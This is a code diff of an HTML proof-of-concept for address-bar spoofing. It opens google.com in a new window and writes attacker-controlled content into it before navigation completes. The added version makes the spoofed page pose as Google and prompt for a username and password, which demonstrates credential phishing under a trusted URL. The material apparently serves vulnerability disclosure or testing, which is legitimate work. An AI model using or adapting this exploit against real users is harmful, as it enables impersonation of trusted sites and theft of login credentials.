@@ -1,26 +1,31 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <button onclick="spoof()">Run PoC</button>
-
-    <script>
-      function spoof() {
-        // Open target URL (spoofed address bar)
-        let win = window.open("https://www.google.com/", "_blank");
-
-        // Inject content before navigation commits
-        setTimeout(() => {
-          try {
-            win.document.write(`
-              <h1>Not Google</h1>
-              <p>This content is rendered while the address bar shows google.com</p>
-            `);
-            win.document.close();
-          } catch (e) {
-            console.log(e);
-          }
-        }, 50);
-      }
-    </script>
-  </body>
-</html>
+<script>
+function spoof() {
+  // Open a new window pointing to the target (will become spoofed URL)
+  let win = window.open("https://www.google.com/", "_blank");
+  
+  // After 50ms, inject content before navigation completes
+  setTimeout(() => {
+    try {
+      win.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Google</title>
+        </head>
+        <body>
+          <h1>This is not Google!</h1>
+          <button onclick="
+            let username = prompt('Enter your username');
+            let password = prompt('Enter your password');
+            alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+          ">Click me</button>
+        </body>
+        </html>
+      `);
+      win.document.close();
+    } catch (e) {
+      console.warn("Blocked by browser protections:", e);
+    }
+  }, 50);
+}
+</script>
